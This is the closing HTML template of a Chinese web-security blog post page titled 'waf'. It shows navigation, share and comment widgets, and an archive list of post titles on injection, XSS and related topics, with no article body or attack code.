+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/09/07/无需登录绕过waf可union-select跨表查询/">
+                    无需登录绕过waf可union-select跨表查询
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/06/01/Sql注入 - 0day审计案例/">
+                    Sql注入 - 0day审计案例
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"true"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"waf　| 绝大部分的不公平来源于自身的能力，别忘记你的情敌正在努力　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2019/09/07/waf/" data-title="waf" data-url="https://yearn.online/2019/09/07/waf/"></div>
+    <script>
+        var duoshuoQuery = {short_name:""};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+    </script>
+    
+    <script> loadComment(); </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/09/07/无需登录绕过waf可union-select跨表查询/" title="Pre: 无需登录绕过waf可union-select跨表查询">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/06/01/Sql注入 - 0day审计案例/" title="Next: Sql注入 - 0day审计案例">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/11/02/PHP远程代码执行漏洞预警（CVE-2019-11043）/">PHP远程代码执行漏洞预警（CVE-2019-11043）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/01/变量覆盖漏洞-1/">变量覆盖漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/30/XXE-实体注入 -1/">XXE - 实体注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/29/XXE漏洞(CVE-2019-2888)分析/">WebLogic EJBTaglibDescriptor XXE漏洞(CVE-2019-2888)分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/28/SSRF-服务器端请求伪造-1/">SSRF - 服务器端请求伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/26/探究if条件语句引发的两个Web漏洞/">探究if条件语句引发的两个Web漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/25/文件上传漏洞-解析、验证伪造三/">文件上传漏洞----解析、验证伪造 三</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/文件上传漏洞-解析、验证伪造二/">文件上传漏洞----解析、验证伪造 二</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/22/WordPress =5.2.3/">WordPress <=5.2.3：如何查看未授权文章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/21/文件上传漏洞-解析、验证伪造一/">文件上传漏洞----解析、验证、伪造 一</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/19/CSP绕过思路及总结/">CSP绕过思路及总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/18/CSRF-1/">CSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/17/PCRE绕过/">PCRE绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/16/Dom-Based-XSS-1/">Dom Based XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/15/储存型XSS-1/">储存型XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/10/反序列化导致任意代码执行/">Typecho install.php 反序列化导致任意代码执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/10/XSS的原理分析与解剖-1/">XSS的原理分析与解剖</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/09/Linux提权/">Linux提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/09/Oracle注入-—-报错注入/">Oracle注入 — 报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/08/MSSQL注入-—-反弹注入/">MSSQL注入 — 反弹注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/06/MySQL注入-—-Dns-注入/">MySQL注入 — Dns 注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/通过Shodan发现目标应用Marathon服务的RCE漏洞/">通过Shodan发现目标应用Marathon服务的RCE漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/01/DNS隧道流量分析/">DNS隧道流量分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/01/Acccess偏移注入-1/">Acccess偏移注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/26/WordPress插件中的XSS漏洞的复现分析与利用/">WordPress插件中的XSS漏洞的复现分析与利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/26/宽字节注入-1/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/25/盲注-1/">盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/24/MS08-067如何利用/">MS08_067如何利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/24/POST注入-HEAD注入/">POST注入/HEAD注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/22/SQL注入的原理分析/">SQL注入的原理分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/21/正则表达式/">正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/20/后端基础SQL—高级查询与子查询/">后端基础SQL—高级查询与子查询</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/07/无需登录绕过waf可union-select跨表查询/">无需登录绕过waf可union-select跨表查询</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/07/waf/">waf</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/01/Sql注入 - 0day审计案例/">Sql注入 - 0day审计案例</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/28/支付漏洞/">支付漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/27/平行越权、垂直越权/">平行越权、垂直越权</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/27/验证码绕过、密码找回漏洞/">验证码绕过、密码找回漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/27/unserialize反序列化漏洞/">unserialize反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/27/本地包含与远程包含/">本地包含与远程包含</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/23/变量覆盖漏洞/">变量覆盖漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/21/SSRF-服务器端请求伪造/">SSRF - 服务器端请求伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/19/XXE-实体注入/">XXE - 实体注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/19/文件上传漏洞-解析、验证伪造（三）/">文件上传漏洞----解析、验证伪造（三）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/18/文件上传漏洞-解析、验证伪造（二）/">文件上传漏洞----解析、验证伪造（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/09/文件上传漏洞-解析、验证伪造（一）/">文件上传漏洞----解析、验证、伪造（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/08/CSRF/">CSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/Dom-Based-XSS/">Dom Based XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/储存型XSS/">储存型XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/28/XSS的原理分析与解剖/">XSS的原理分析与解剖</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/27/Oracle报错注入/">Oracle注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/MSQL反弹注入0-0/">MSQL反弹注入0.0</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/25/Acccess偏移注入/">Acccess偏移注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/MYSQL-Dns注入/">MYSQL-Dns注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/宽字节注入/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/盲注/">MYSQL注入天书之盲注讲解</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/POST注入原理分分析/">POST注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/sql注入原理分析/">sql注入原理分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/正则小试牛刀/">正则小试牛刀</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/测试哦！/">测试哦！</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019 yearn
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>|</span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+
+</footer>
+    </div>
+    
+    <script src="/js/GithubRepoWidget.js"></script>
+
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+             github: ".github-widget a", 
+             title: "a.article-title, .article-more-link a", 
+             post: ".article-entry a[href], .copyright a[href]", 
+             tags: ".article-tag a", 
+             categories: ".article-category a, a.tag-list-link", 
+             articleNav: "#article-nav a, #post-nav-button a", 
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+             menu: ".header-menu a", 
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":150},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
